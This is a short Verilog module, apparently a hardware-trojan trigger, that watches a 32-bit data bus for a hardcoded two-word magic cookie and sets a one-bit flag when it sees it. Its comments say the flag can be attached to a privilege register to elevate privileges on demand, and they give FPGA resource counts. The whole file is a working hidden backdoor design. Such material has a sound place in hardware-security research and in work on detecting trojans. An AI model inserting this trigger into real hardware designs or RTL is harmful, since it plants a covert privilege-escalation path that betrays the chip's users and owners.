// Sorath magic-number detector
// Tiny state-machine that recognizes a 64-bit magic number in a 32-bit bus and activates a flag.
// When the logic see the cookie (32 bits+32 bits) it enables a single-bit register. This can be attached to a privilege register, so it elevates privileges when the magic-number is seen. 
// "The mystery of Sorath and his number 666 holds the secret of black magic."
// Total logic elements: ~17 (Cyclone IV)
// Total registers: 2 (Cyclone IV)


module sorath    (
// Clocks and resets
input wire HCLK, 
input wire HRESETn ,  

// INPUT BUS
input wire [31:0] HWDATA,

// OUTPUT PORT
output reg SIGNAL_DETECTED
);
 
reg [5:0] RTKState;
reg [8:0] RTKCmd;

`define RTK_FIND_START	5'h0
`define RTK_FIND_2	5'h1

// 64-bit initial trigger cookie hardcoded here
// I.E. memcpy "\x12\x34\x56\x78\x43\x42\x41\x40";
`define RTK_COOKIE_1 32'h12345678
`define RTK_COOKIE_2 32'h43424140

always @(posedge HCLK or negedge HRESETn)
	begin
	if (!HRESETn) // Reset
		begin
		RTKState<=`RTK_FIND_START;
		SIGNAL_DETECTED<=0;
		end
	else	begin
		case (RTKState)
			`RTK_FIND_START: // Find first part of cookie
				if ( HWDATA ==`RTK_COOKIE_1)
					begin
					RTKState<=`RTK_FIND_2;
					end
			`RTK_FIND_2: // Load second part of cookie
				begin
				if ( HWDATA ==`RTK_COOKIE_2)
					begin
					SIGNAL_DETECTED<=1;
					end
				RTKState<=`RTK_FIND_START;
				end
		endcase
		end
	end
endmodule
